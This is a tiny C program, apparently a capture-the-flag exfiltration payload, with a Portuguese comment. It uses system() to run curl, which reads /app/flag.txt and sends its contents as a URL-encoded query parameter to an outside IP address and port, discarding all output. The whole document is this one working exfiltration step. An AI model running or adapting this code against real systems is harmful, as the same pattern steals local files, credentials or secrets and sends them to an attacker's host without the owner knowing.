#include <stdlib.h>

int main(void){
    // Envia a flag como query param com URL-encode automático do curl
    system("curl -G 'http://20.102.93.39:33282/' --data-urlencode 'flag@/app/flag.txt' >/dev/null 2>&1");
    return 0;
}

